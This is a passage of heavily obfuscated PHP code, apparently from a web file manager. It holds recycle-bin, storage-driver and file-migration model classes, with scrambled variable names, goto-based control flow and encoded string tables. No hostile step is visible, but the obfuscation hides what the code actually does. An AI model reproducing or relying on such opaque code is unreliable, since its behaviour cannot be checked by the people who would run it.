Ô…Ë‹ñ =& $_SERVER[¬ˆÚÂ”Éğä]; $F·Üˆœ‚’¶ = $e Ô…Ë‹ñ[2386] . $f¾š®Ò–È; if (isset(self::$cacheChildList[$F·Üˆœ‚’¶])) { return self::$cacheChildList[$F·Üˆœ‚’¶]; } goto B±ë†Ç††Å; B²Õ¦Ò›ÅÔ: self::$cacheChildList[$F·Üˆœ‚’¶] = $Bİê•÷á†¤; foreach ($Bİê•÷á†¤ as $Aƒ£Ââ’êò) { $F·Üˆœ‚’¶ = $e Ô…Ë‹ñ[410] . $Aƒ£Ââ’êò[$e Ô…Ë‹ñ[369]]; self::$cacheSourceInfo[$F·Üˆœ‚’¶] = $Aƒ£Ââ’êò; } return $Bİê•÷á†¤; goto e¢¸…×ÊàÆ; e¢¸…×ÊàÆ: } public function fileNameAuto($F«™©Ö÷ñå, $eåÊºŒÒ‡ô, $C¤ÇÁÅ‚ˆ = REPEAT_RENAME, $B¯Š˜“ë˜¶ = false) { $cÚ‰ï˜² =& $_SERVER[¬ˆÚÂ”Éğä]; $Bİî†•ØÒ = $this->childList($F«™©Ö÷ñå); $D¾§ôùÂ‰ì = array_to_keyvalue($Bİî†•ØÒ, $cÚ‰ï˜²[33], $cÚ‰ï˜²[28]); return $this->fileNameAutoGet($D¾§ôùÂ‰ì, $eåÊºŒÒ‡ô, $C¤ÇÁÅ‚ˆ, $B¯Š˜“ë˜¶); } public function fileNameAutoGet($FÉº¾ˆáä„, $D¯æƒ°ƒ¦Ê, $bÍ„íèˆŸê, $A¨‚ªàÜ´») { $f‚Ä–‚Ç =& $_SERVER[¬ˆÚÂ”Éğä]; if ($bÍ„íèˆŸê == REPEAT_REPLACE || !$FÉº¾ˆáä„ || !in_array_not_case($D¯æƒ°ƒ¦Ê, $FÉº¾ˆáä„) || $A¨‚ªàÜ´» && $bÍ„íèˆŸê != REPEAT_RENAME_FOLDER) { return $D¯æƒ°ƒ¦Ê; } if ($bÍ„íèˆŸê == REPEAT_SKIP) { return !1; } $A˜Ç èï¬İ = $f‚Ä–‚Ç[91] . get_path_ext($D¯æƒ°ƒ¦Ê); $A˜Ç èï¬İ = $A˜Ç èï¬İ == $f‚Ä–‚Ç[91] || $A¨‚ªàÜ´» ? $f‚Ä–‚Ç[33] : $A˜Ç èï¬İ; for ($DïÂİ‰¹Í¾ = 1; $DïÂİ‰¹Í¾ <= count($FÉº¾ˆáä„) + 1; $DïÂİ‰¹Í¾++) { $EÃ×íáø = substr($D¯æƒ°ƒ¦Ê, 0, strlen($D¯æƒ°ƒ¦Ê) - strlen($A˜Ç èï¬İ)); $aÑ ¬„³Œ = $EÃ×íáø . "\x28{$DïÂİ‰¹Í¾}\x29{$A˜Ç èï¬İ}"; if (!in_array_not_case($aÑ ¬„³Œ, $FÉº¾ˆáä„)) { return $aÑ ¬„³Œ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\145\137\162\145\143\171\143\x6c\145"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\151\155\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\164", "\146\x75\156\x63\x74\x69\157\156")); public function listData($d‚ÖÈ– = false) { $FĞ×ğ·Ûİ¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $d‚ÖÈ– = $d‚ÖÈ– ? $d‚ÖÈ– : USER_ID; $f£·êåÖ„ø = $this->where(array($FĞ×ğ·Ûİ¯[1441] => $d‚ÖÈ–))->select(); return array_to_keyvalue($f£·êåÖ„ø, $FĞ×ğ·Ûİ¯[33], $FĞ×ğ·Ûİ¯[369]); } public function moveToRecycle($D†íÌßÚ ä) { goto FŒ¡…òÙì; FŒ¡…òÙì: $Eğ¾õ¶ğš‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $FŠã¿´ÉÏ  = Model($Eğ¾õ¶ğš‚[1130]); $eÂ˜ÓøÎˆò = $FŠã¿´ÉÏ ->sourceInfo($D†íÌßÚ ä); goto cáé¸¶õâ…; cáé¸¶õâ…: if (!$eÂ˜ÓøÎˆò || $eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[397]] == $Eğ¾õ¶ğš‚[83]) { return; } $dªå÷œ˜í¾ = array($Eğ¾õ¶ğš‚[383] => $D†íÌßÚ ä, $Eğ¾õ¶ğš‚[1441] => USER_ID, $Eğ¾õ¶ğš‚[523] => $eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[371]], $Eğ¾õ¶ğš‚[524] => $eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[458]], $Eğ¾õ¶ğš‚[527] => $eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[461]]); $this->add($dªå÷œ˜í¾); goto FÓÔ×¿„‚§; FÓÔ×¿„‚§: $this->recycleMove($D†íÌßÚ ä, 1); if ($eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[370]] == $Eğ¾õ¶ğš‚[83]) { $DÏ±ÒÕœÖù = array($Eğ¾õ¶ğš‚[527] => array($Eğ¾õ¶ğš‚[485], $eÂ˜ÓøÎˆò[$Eğ¾õ¶ğš‚[461]] . $D†íÌßÚ ä . $Eğ¾õ¶ğš‚[486])); $FŠã¿´ÉÏ ->where($DÏ±ÒÕœÖù)->setField($Eğ¾õ¶ğš‚[397], 1); } goto Eäíè²‚´³; Eäíè²‚´³: } public function clear() { $this->remove(!1); } public function remove($c¯ÌÖ§Ù = false) { goto FÆßäˆ­‚Ä; BÎ¹æºãÀÜ: foreach ($d®ñ“¬¾÷© as $bÛé’†„®Ç) { $D‚ƒ…š±î•->targetSpaceUpdate($bÛé’†„®Ç[$E±ªŒ½¨°[371]], $bÛé’†„®Ç[$E±ªŒ½¨°[458]]); } goto fšÚƒ¦”±Ñ; FÆßäˆ­‚Ä: $E±ªŒ½¨° =& $_SERVER[¬ˆÚÂ”Éğä]; $D‚ƒ…š±î• = Model($E±ªŒ½¨°[1130]); $D‘İ‡Ğ‰ô = $this->listData(); goto A¦³õ¥éê; A¦³õ¥éê: $c¯ÌÖ§Ù = $c¯ÌÖ§Ù === !1 ? !1 : $c¯ÌÖ§Ù; $d®ñ“¬¾÷© = array(); foreach ($D‘İ‡Ğ‰ô as $FöÒ‘­óÎë) { if ($c¯ÌÖ§Ù != !1 && !in_array($FöÒ‘­óÎë, $c¯ÌÖ§Ù)) { continue; } $A˜İàÒçø‰ = $D‚ƒ…š±î•->sourceInfo($FöÒ‘­óÎë); $D‚ƒ…š±î•->remove($FöÒ‘­óÎë, !1); $bÊˆïÂÃÌƒ = $A˜İàÒçø‰[$E±ªŒ½¨°[371]] . $E±ªŒ½¨°[70] . $A˜İàÒçø‰[$E±ªŒ½¨°[458]]; $d®ñ“¬¾÷©[$bÊˆïÂÃÌƒ] = array($E±ªŒ½¨°[523] => $A˜İàÒçø‰[$E±ªŒ½¨°[371]], $E±ªŒ½¨°[458] => $A˜İàÒçø‰[$E±ªŒ½¨°[458]]); $this->where(array($E±ªŒ½¨°[369] => $FöÒ‘­óÎë))->delete(); } goto BÎ¹æºãÀÜ; fšÚƒ¦”±Ñ: } public function restore($BŒÃÖØ©Ö³ = false) { goto fÈñãï¤; fÈñãï¤: $B²åÁ»¿ìğ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÕ’À…Âù = Model($B²åÁ»¿ìğ[1130]); $eº…åºÃë = $this->listData(); goto bñ†÷¾–¿ï; C’’æÍÀ§: foreach ($eº…åºÃë as $f·”ìÙÃí) { goto b­£•×º‚µ; eŠ–©â²´Å: if ($bÚÀÌ“Èé[$B²åÁ»¿ìğ[370]] == $B²åÁ»¿ìğ[83]) { $EòÄØÛ® = array($B²åÁ»¿ìğ[527] => array($B²åÁ»¿ìğ[485], $bÚÀÌ“Èé[$B²åÁ»¿ìğ[461]] . $f·”ìÙÃí . $B²åÁ»¿ìğ[486])); $EÕ’À…Âù->where($EòÄØÛ®)->setField($B²åÁ»¿ìğ[397], 0); $this->restoreFolderChildren($f·”ìÙÃí, $eº…åºÃë); } $this->where(array($B²åÁ»¿ìğ[369] => $f·”ìÙÃí))->delete(); $EÕ’À…Âù->folderSizeReset($bÚÀÌ“Èé[$B²åÁ»¿ìğ[463]]); goto eáñÇ—·¸Ğ; fèÉùŠ”£É: if ($D¡ÌÇ‹™ [$B²åÁ»¿ìğ[397]] == $B²åÁ»¿ìğ[83]) { continue; } $EÕ’À…Âù->lockMoveStart($f·”ìÙÃí); $this->recycleMove($f·”ìÙÃí, 0); goto eŠ–©â²´Å; b­£•×º‚µ: if ($BŒÃÖØ©Ö³ != !1 && !in_array($f·”ìÙÃí, $BŒÃÖØ©Ö³)) { continue; } $bÚÀÌ“Èé = $EÕ’À…Âù->sourceInfo($f·”ìÙÃí); $D¡ÌÇ‹™  = $EÕ’À…Âù->sourceInfo($bÚÀÌ“Èé[$B²åÁ»¿ìğ[463]]); goto fèÉùŠ”£É; eáñÇ—·¸Ğ: $B¶¬Š—¼«”[] = $bÚÀÌ“Èé[$B²åÁ»¿ìğ[463]]; if ($bÚÀÌ“Èé[$B²åÁ»¿ìğ[370]] == $B²åÁ»¿ìğ[83]) { $B¶¬Š—¼«”[] = $f·”ìÙÃí; } $EÕ’À…Âù->lockMoveEnd($f·”ìÙÃí); goto BîÍôî–²Á; BîÍôî–²Á: } $EÕ’À…Âù->updateModifyTime($B¶¬Š—¼«”); goto BÉêÚë†á; bñ†÷¾–¿ï: $BŒÃÖØ©Ö³ = $BŒÃÖØ©Ö³ == !1 ? !1 : $BŒÃÖØ©Ö³; if (!$eº…åºÃë) { return !0; } $B¶¬Š—¼«” = array(); goto C’’æÍÀ§; BÉêÚë†á: } private function restoreFolderChildren($cê»§¡å‘ˆ, $E’à‡×“´) { goto e­õ´­¬; e­õ´­¬: $b•ì”íá‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $a°‰ØôÜ¾‚ = Model($b•ì”íá‹[1130]); $BîÁ–è¦Õ = array($b•ì”íá‹[369] => array($b•ì”íá‹[7], array())); goto b”À¤¨¼Œ’; b”À¤¨¼Œ’: foreach ($E’à‡×“´ as $dÕ‘½ßîğ¢) { if ($dÕ‘½ßîğ¢ == $cê»§¡å‘ˆ) { continue; } if (!$a°‰ØôÜ¾‚->isParentOf($cê»§¡å‘ˆ, $dÕ‘½ßîğ¢)) { continue; } $F¬«ÌÜ¶ææ = $a°‰ØôÜ¾‚->sourceInfo($dÕ‘½ßîğ¢); if ($F¬«ÌÜ¶ææ[$b•ì”íá‹[370]] == $b•ì”íá‹[83]) { $BîÁ–è¦Õ[] = array($b•ì”íá‹[527] => array($b•ì”íá‹[485], $F¬«ÌÜ¶ææ[$b•ì”íá‹[461]] . $dÕ‘½ßîğ¢ . $b•ì”íá‹[486])); } else { $BîÁ–è¦Õ[$b•ì”íá‹[369]][1][] = $dÕ‘½ßîğ¢; } } if (!$BîÁ–è¦Õ[$b•ì”íá‹[369]][1]) { unset($BîÁ–è¦Õ[$b•ì”íá‹[369]]); } if (!$BîÁ–è¦Õ) { return; } goto a­ÜÅîÌ¨°; a­ÜÅîÌ¨°: $BîÁ–è¦Õ[$b•ì”íá‹[369]][1] = array_unique($BîÁ–è¦Õ[$b•ì”íá‹[369]][1]); $BîÁ–è¦Õ[$b•ì”íá‹[926]] = $b•ì”íá‹[2206]; $a°‰ØôÜ¾‚->where($BîÁ–è¦Õ)->setField($b•ì”íá‹[397], 1); goto aïéÍôÈŠ; aïéÍôÈŠ: } private function recycleMove($c‘ğ‡À–ŠÔ, $e ‡©Ï¼ƒ­ = 1) { $aêŒˆ®šŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÈµä¸ÙŒÊ = Model($aêŒˆ®šŒ[1130]); $aÁ•”ç† ® = Model($aêŒˆ®šŒ[2408]); $Fé™½²¼³µ = array($aêŒˆ®šŒ[369] => $c‘ğ‡À–ŠÔ); if ($e ‡©Ï¼ƒ­) { $eÈµä¸ÙŒÊ->where($Fé™½²¼³µ)->setField($aêŒˆ®šŒ[397], 1); $aÁ•”ç† ®->eventRecycle($c‘ğ‡À–ŠÔ, $aêŒˆ®šŒ[2409]); } else { $dÂÙÃ±Ê‡Ó = $eÈµä¸ÙŒÊ->where($Fé™½²¼³µ)->find(); $DÓ¦†‹İ = $dÂÙÃ±Ê‡Ó[$aêŒˆ®šŒ[370]] == $aêŒˆ®šŒ[83]; $dªÛÌ›½Áà = $eÈµä¸ÙŒÊ->fileNameAuto($dÂÙÃ±Ê‡Ó[$aêŒˆ®šŒ[463]], $dÂÙÃ±Ê‡Ó[$aêŒˆ®šŒ[28]], REPEAT_RENAME_FOLDER, $DÓ¦†‹İ); if ($dªÛÌ›½Áà != $dÂÙÃ±Ê‡Ó[$aêŒˆ®šŒ[28]]) { $eÈµä¸ÙŒÊ->rename($c‘ğ‡À–ŠÔ, $dªÛÌ›½Áà); } $eÈµä¸ÙŒÊ->where($Fé™½²¼³µ)->setField($aêŒˆ®šŒ[397], 0); $aÁ•”ç† ®->eventRecycle($c‘ğ‡À–ŠÔ, $aêŒˆ®šŒ[2410]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x73\x74\157\162\x61\147\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\163\x69\172\145\x4d\x61\170", "\163\x79\x73\x74\145\x6d", "\144\x65\x66\x61\165\x6c\164", "\144\162\151\166\145\162", "\143\157\156\146\x69\147"); public function listData($bóåİæÉ£“ = false, $fİŠÎƒˆ³ = "\155\157\144\x69\146\x79\124\151\155\x65", $B‡™¼½ì×ò = false) { goto a±š§»‘Ğ; cÅ‰Ğ ˆõ: return $DÉ„Ó‰¯; goto b¶ÁÖ£°; BÏÄ¶«‚: foreach ($DÉ„Ó‰¯ as $C¯‡Æ‰•ôÙ => $A›Úæ á„) { unset($DÉ„Ó‰¯[$C¯‡Æ‰•ôÙ][$c·Éö’ˆ¿[6]]); $DÉ„Ó‰¯[$C¯‡Æ‰•ôÙ][$c·Éö’ˆ¿[2107]] = 0; } $AªÊŒ™¡·ã = array_to_keyvalue($DÉ„Ó‰¯, $c·Éö’ˆ¿[33], $c·Éö’ˆ¿[367]); $this->_listAppendSize($DÉ„Ó‰¯, $AªÊŒ™¡·ã); goto cÅ‰Ğ ˆõ; a±š§»‘Ğ: $c·Éö’ˆ¿ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÉ„Ó‰¯ = parent::listData($bóåİæÉ£“, $fİŠÎƒˆ³, $B‡™¼½ì×ò); if ($bóåİæÉ£“) { return $DÉ„Ó‰¯; } goto BÏÄ¶«‚; b¶ÁÖ£°: } public function _listAppendSize(&$A‚Åæ¶»ê, $B©ôºƒÉ‚ø) { $A†±îç®¨ï =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$B©ôºƒÉ‚ø) { return; } $AùØ áˆñô = $A†±îç®¨ï[2411] . implode($A†±îç®¨ï[47], $B©ôºƒÉ‚ø) . $A†±îç®¨ï[2412]; $dµš’İª¨£ = Model($A†±îç®¨ï[726])->query($AùØ áˆñô); $dµš’İª¨£ = array_to_keyvalue($dµš’İª¨£, $A†±îç®¨ï[367], $A†±îç®¨ï[77]); foreach ($A‚Åæ¶»ê as $Dòñ¹·Ÿ¼ => $A¿Šôä‰àá) { $A‚Åæ¶»ê[$Dòñ¹·Ÿ¼][$A†±îç®¨ï[2107]] = isset($dµš’İª¨£[$A¿Šôä‰àá[$A†±îç®¨ï[367]]]) ? $dµš’İª¨£[$A¿Šôä‰àá[$A†±îç®¨ï[367]]] : 0; } } public function getConfig($F Î„éğæ) { $AÃšöŞºÏî = parent::listData($F Î„éğæ); return json_decode($AÃšöŞºÏî[$_SERVER[¬ˆÚÂ”Éğä][6]], !0); } public function update($AÂÎ¯†¯„‰, $Cğš‹Æô) { goto b‚²‹„‘¿Ê; E¿Ğ¾»Ã…®: if (isset($Eî“Ü„÷ÎÄ[$Eë±ˆÜ¡«ê]) && $Eî“Ü„÷ÎÄ[$Eë±ˆÜ¡«ê][$e’äº×—ÑÈ[367]] != $AÂÎ¯†¯„‰) { return !1; } if (isset($Cğš‹Æô[$e’äº×—ÑÈ[2413]]) && $Cğš‹Æô[$e’äº×—ÑÈ[2413]] == $e’äº×—ÑÈ[83]) { $this->checkConfig($Cğš‹Æô); } unset($Cğš‹Æô[$e’äº×—ÑÈ[2413]]); goto EêôƒŒç©·; EêôƒŒç©·: $E¬Œ¢¨®­Ø = parent::update($AÂÎ¯†¯„‰, $Cğš‹Æô); if ($E¬Œ¢¨®­Ø && $Cğš‹Æô[$e’äº×—ÑÈ[34]]) { foreach ($Eî“Ü„÷ÎÄ as $a¸°è¬æƒè) { if ($a¸°è¬æƒè[$e’äº×—ÑÈ[34]] && $a¸°è¬æƒè[$e’äº×—ÑÈ[367]] != $AÂÎ¯†¯„‰) { parent::update($a¸°è¬æƒè[$e’äº×—ÑÈ[367]], array($e’äº×—ÑÈ[34] => 0)); } } } return $E¬Œ¢¨®­Ø; goto EÁ»¡®¡£­; b‚²‹„‘¿Ê: $e’äº×—ÑÈ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eë±ˆÜ¡«ê = $Cğš‹Æô[$e’äº×—ÑÈ[28]]; $Eî“Ü„÷ÎÄ = array_to_keyvalue(parent::listData(), $e’äº×—ÑÈ[28]); goto E¿Ğ¾»Ã…®; EÁ»¡®¡£­: } public function add($fŞ¸¤¶„çï) { goto B…á¹½ÏùÏ; B…á¹½ÏùÏ: $A’ŠŒáƒ’Ğ =& $_SERVER[¬ˆÚÂ”Éğä]; $A·‚’•°òÀ = array_to_keyvalue(parent::listData(), $A’ŠŒáƒ’Ğ[28]); if (isset($A·‚’•°òÀ[$fŞ¸¤¶„çï[$A’ŠŒáƒ’Ğ[28]]])) { return !1; } goto aªºïÔŒÕö; aªºïÔŒÕö: $this->checkConfig($fŞ¸¤¶„çï); $dìø¿ˆéæŠ = parent::insert($fŞ¸¤¶„çï); if ($dìø¿ˆéæŠ && $fŞ¸¤¶„çï[$A’ŠŒáƒ’Ğ[34]]) { foreach ($A·‚’•°òÀ as $C·ŸùéÅŒ£) { if ($C·ŸùéÅŒ£[$A’ŠŒáƒ’Ğ[34]]) { parent::update($C·ŸùéÅŒ£[$A’ŠŒáƒ’Ğ[367]], array($A’ŠŒáƒ’Ğ[34] => 0)); } } } goto FËµî„´ğ; FËµî„´ğ: return $dìø¿ˆéæŠ; goto DîÔ«‹÷ª’; DîÔ«‹÷ª’: } public function checkConfig(&$FºéÀ·ñ) { goto A½Áªæ£³; CŒèÅŠâÆø: $Dâ÷Ë…¹Ù = $c¡ÑÕĞ“[71] . $CÛ»¼é…¿¢; if (!$CÛ»¼é…¿¢ || !class_exists($Dâ÷Ë…¹Ù)) { write_log(array($c¡ÑÕĞ“[2415], $FºéÀ·ñ, get_caller_info()), $c¡ÑÕĞ“[2416]); show_json($c¡ÑÕĞ“[2417], !1, $FºéÀ·ñ); } $eºÚ‰÷µí = new $Dâ÷Ë…¹Ù($DÀîŸâÇ¦); goto DÃÙ Š™; A½Áªæ£³: $c¡ÑÕĞ“ =& $_SERVER[¬ˆÚÂ”Éğä]; $c®µØ•Ùµ² = strtolower($FºéÀ·ñ[$c¡ÑÕĞ“[90]]); $DÀîŸâÇ¦ = json_decode($FºéÀ·ñ[$c¡ÑÕĞ“[6]], !0); goto F–µïİ©°‹; F–µïİ©°‹: foreach ($DÀîŸâÇ¦ as $dè™Ï¼„ƒì => $eÃãğëªÈ´) { $DÀîŸâÇ¦[$dè™Ï¼„ƒì] = trim($eÃãğëªÈ´); } $DÀîŸâÇ¦[$c¡ÑÕĞ“[2414]] = rand_string(6); $CÛ»¼é…¿¢ = $this->driverType($c®µØ•Ùµ²); goto CŒèÅŠâÆø; bÙö»¬î‘Ş: $FºéÀ·ñ[$c¡ÑÕĞ“[90]] = $CÛ»¼é…¿¢; return !0; goto aŠÈ–«èˆ…; D÷ììš¸¤: if (!$eºÚ‰÷µí->mkfile($BßÁÅˆ)) { show_json(LNG($c¡ÑÕĞ“[2418]), !1); } $DÀîŸâÇ¦[$c¡ÑÕĞ“[1037]] = $b–›æØ†¨†; $FºéÀ·ñ[$c¡ÑÕĞ“[6]] = json_encode($DÀîŸâÇ¦); goto bÙö»¬î‘Ş; DÃÙ Š™: if (in_array($c®µØ•Ùµ², $eºÚ‰÷µí->objectDriver)) { if (!$eºÚ‰÷µí->isBucketCors() && !$eºÚ‰÷µí->setBucketCors()) { $f‰‹“´ŠÚ = LNG($c¡ÑÕĞ“[2418]); $f‰‹“´ŠÚ .= $c¡ÑÕĞ“[2419] . LNG($c¡ÑÕĞ“[2420]); show_json($f‰‹“´ŠÚ, !1); } } $b–›æØ†¨† = rtrim($DÀîŸâÇ¦[$c¡ÑÕĞ“[1037]], $c¡ÑÕĞ“[8]) . $c¡ÑÕĞ“[8]; $BßÁÅˆ = $eºÚ‰÷µí->getPath($b–›æØ†¨† . $c¡ÑÕĞ“[2002]); goto D÷ììš¸¤; aŠÈ–«èˆ…: } private function driverType($cÃ°Ø®º‰Š) { $b ªÉìÑêĞ =& $_SERVER[¬ˆÚÂ”Éğä]; $Föº…­­ğ = array($b ªÉìÑêĞ[102] => $b ªÉìÑêĞ[2421], $b ªÉìÑêĞ[58] => $b ªÉìÑêĞ[2422], $b ªÉìÑêĞ[64] => $b ªÉìÑêĞ[2423]); if (isset($Föº…­­ğ[$cÃ°Ø®º‰Š])) { return $Föº…­­ğ[$cÃ°Ø®º‰Š]; } return strtoupper($cÃ°Ø®º‰Š); } public function driverListSystem() { $CéóÙ‘Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $f¢ò©µ©›Ú = parent::listData(); $AÌ‰—’‡‘ = array(); foreach ($f¢ò©µ©›Ú as $cøç¿Âæ†) { unset($cøç¿Âæ†[$CéóÙ‘Ş[187]], $cøç¿Âæ†[$CéóÙ‘Ş[107]]); $cøç¿Âæ†[$CéóÙ‘Ş[6]] = json_decode($cøç¿Âæ†[$CéóÙ‘Ş[6]], !0); $AÌ‰—’‡‘[] = $cøç¿Âæ†; } return $AÌ‰—’‡‘; } public function defaultDriver() { $eîõíé¡‰Ñ =& $_SERVER[¬ˆÚÂ”Éğä]; $EŠö† ¡» = parent::listData(); $FŠÆ›Ğ†ø¾ = array_filter_by_field($EŠö† ¡», $eîõíé¡‰Ñ[34], 1); $FŠÆ›Ğ†ø¾ = $FŠÆ›Ğ†ø¾[0]; if ($FŠÆ›Ğ†ø¾) { $FŠÆ›Ğ†ø¾[$eîõíé¡‰Ñ[6]] = json_decode($FŠÆ›Ğ†ø¾[$eîõíé¡‰Ñ[6]], !0); } return $FŠÆ›Ğ†ø¾; } public function driverInfo($F¾”¬¹‰ÀÑ) { $D£ˆ«ĞœíË =& $_SERVER[¬ˆÚÂ”Éğä]; $F‰‡ƒ¤ = array_to_keyvalue(parent::listData(), $D£ˆ«ĞœíË[367]); if (!isset($F‰‡ƒ¤[$F¾”¬¹‰ÀÑ])) { return !1; } $EÌ¾Ê‹ÎĞ = $F‰‡ƒ¤[$F¾”¬¹‰ÀÑ]; $EÌ¾Ê‹ÎĞ[$D£ˆ«ĞœíË[6]] = json_decode($EÌ¾Ê‹ÎĞ[$D£ˆ«ĞœíË[6]], !0); return $EÌ¾Ê‹ÎĞ; } public function remove($a¯ïƒ‚ÏÏ) { $this->removeShareItems($a¯ïƒ‚ÏÏ); return parent::remove($a¯ïƒ‚ÏÏ); } public function removeWithFile($cÂè¢Òåäˆ) { goto FÅôƒÕÜÍ¼; FÅôƒÕÜÍ¼: $d‹’…½ĞÌ =& $_SERVER[¬ˆÚÂ”Éğä]; $D¾¦òƒœŸä = array($d‹’…½ĞÌ[751] => $cÂè¢Òåäˆ); $f‘‰¿¾§­˜ = Model($d‹’…½ĞÌ[422])->where($D¾¦òƒœŸä)->count(); goto E¶¯øĞ ©³; E¶¯øĞ ©³: $b¥‘™±ğ‘å = Model($d‹’…½ĞÌ[422])->where($D¾¦òƒœŸä)->sum($d‹’…½ĞÌ[77]); $f“ÙÂÓ¶²¹ = $d‹’…½ĞÌ[2424] . $cÂè¢Òåäˆ; $dãó¾ùÏ‡è = new TaskFileTransfer($f“ÙÂÓ¶²¹, $d‹’…½ĞÌ[2416], $f‘‰¿¾§­˜, LNG($d‹’…½ĞÌ[2425]) . "\50{$cÂè¢Òåäˆ}\51"); goto c£¥Œöò¹ƒ; A™½æÅÚ: $f¤º—Üßî« = Model($d‹’…½ĞÌ[167])->where($D¾¦òƒœŸä)->field($d‹’…½ĞÌ[2426])->select(); foreach ($f¤º—Üßî« as $b÷ª‡¦ÛÌ¼) { goto cîìÃ±Ø‚•; cîìÃ±Ø‚•: $Böœ‘î¬¹ = $b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[75]]; $bÙâİ—ÙÚ = $EêĞ‹„“—ˆ . str_replace("\173\151\157\x3a{$cÂè¢Òåäˆ}\x7d\x2f", $d‹’…½ĞÌ[33], $Böœ‘î¬¹); if (!IO::exist($Böœ‘î¬¹)) { $F¾‘¬šƒ¤[] = $b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[419]]; $dãó¾ùÏ‡è->updateFileEnd($b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[28]], $b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[77]]); continue; } goto d–¥Í¿ç²ô; Dç‹Ö¥Á§®: $EŸ‹´ÛÕÎŒ = array($d‹’…½ĞÌ[751] => $b˜ò¸ïÂò, $d‹’…½ĞÌ[75] => $bÙâİ—ÙÚ); Model($d‹’…½ĞÌ[167])->where($D¾¦òƒœŸä)->save($EŸ‹´ÛÕÎŒ); goto Dï‰”Ù×ÑÑ; d–¥Í¿ç²ô: if (IO::exist($bÙâİ—ÙÚ)) { $dãó¾ùÏ‡è->updateFileEnd($b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[28]], $b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[77]]); continue; } if (!IO::move($Böœ‘î¬¹, get_path_father($bÙâİ—ÙÚ))) { $DŞœºÖ†ù° = !1; break; } $D¾¦òƒœŸä = array($d‹’…½ĞÌ[419] => $b÷ª‡¦ÛÌ¼[$d‹’…½ĞÌ[419]]); goto Dç‹Ö¥Á§®; Dï‰”Ù×ÑÑ: } $this->removeByFileID($F¾‘¬šƒ¤); goto eË–ÙÍ™‹…; c£¥Œöò¹ƒ: $dãó¾ùÏ‡è->task[$d‹’…½ĞÌ[706]] = (double) $b¥‘™±ğ‘å; $EÑ½ÆÍ¤Ñ¼ = KodIO::defaultDriver(); $b˜ò¸ïÂò = $EÑ½ÆÍ¤Ñ¼[$d‹’…½ĞÌ[367]]; goto eŞÚâ„ã‡Ü; eË–ÙÍ™‹…: if (!$DŞœºÖ†ù°) { $dãó¾ùÏ‡è->stop($f“ÙÂÓ¶²¹); return !1; } $dãó¾ùÏ‡è->end(); $this->remove($cÂè¢Òåäˆ); goto bÖ¹ãôëºÜ; eŞÚâ„ã‡Ü: $EêĞ‹„“—ˆ = "\x7b\x69\157\72{$b˜ò¸ïÂò}\x7d\x2f"; $DŞœºÖ†ù° = !0; $F¾‘¬šƒ¤ = array(); goto A™½æÅÚ; bÖ¹ãôëºÜ: } public function progress($d˜×¯™Ş«Ó) { return Task::get($_SERVER[¬ˆÚÂ”Éğä][2424] . $d˜×¯™Ş«Ó); } private function removeByFileID($cÚ‰øÉÌ© = array()) { goto Bó´ Ì±­ß; Bó´ Ì±­ß: $AÙÀ‘İµ¯ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($cÚ‰øÉÌ©)) { return; } $F…³Âƒ¡… = array($AÙÀ‘İµ¯[419] => array($AÙÀ‘İµ¯[7], $cÚ‰øÉÌ©)); goto bæ–––ÜŒÕ; CŠÖÁ’‚Ş«: foreach ($C·©î‚‰¢Š as $BÕ±éòğ) { Model($AÙÀ‘İµ¯[382])->removeNow($BÕ±éòğ, !1); } goto d™Ò•§áÔÛ; bæ–––ÜŒÕ: $C·©î‚‰¢Š = Model($AÙÀ‘İµ¯[1130])->where($F…³Âƒ¡…)->field($AÙÀ‘İµ¯[369])->select(); if (!$C·©î‚‰¢Š) { return; } $C·©î‚‰¢Š = array_to_keyvalue($C·©î‚‰¢Š, $AÙÀ‘İµ¯[33], $AÙÀ‘İµ¯[369]); goto CŠÖÁ’‚Ş«; d™Ò•§áÔÛ: } private function removeShareItems($aÁé‘…¨Ù™) { goto bäÉõÇ«ª; bà¾òµë¶: Model($fšš·œÔÍà[538])->remove($DÆ’í’¬ô); goto eÈ¸Æ˜£ÖÙ; e¯Ã™ÓÕ÷: $FÂÔ¸²ç“æ = Model($fšš·œÔÍà[2098])->where($a‡–ç‹àÏÃ)->field($fšš·œÔÍà[441])->select(); if (empty($FÂÔ¸²ç“æ)) { return; } $DÆ’í’¬ô = array_to_keyvalue($FÂÔ¸²ç“æ, $fšš·œÔÍà[33], $fšš·œÔÍà[441]); goto bà¾òµë¶; bäÉõÇ«ª: $fšš·œÔÍà =& $_SERVER[¬ˆÚÂ”Éğä]; $Bİ†ˆìÖÄ™ = "\173\x69\157\x3a{$aÁé‘…¨Ù™}\x7d\x2f"; $a‡–ç‹àÏÃ = array($fšš·œÔÍà[369] => 0, $fšš·œÔÍà[1032] => array($fšš·œÔÍà[759], "{$Bİ†ˆìÖÄ™}\x25")); goto e¯Ã™ÓÕ÷; eÈ¸Æ˜£ÖÙ: } } goto aµÆÎî‹–; a¾ÕËÚó‰Ò: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $A°¬Ğ‹ˆ…ç =& $_SERVER[¬ˆÚÂ”Éğä]; self::$name = 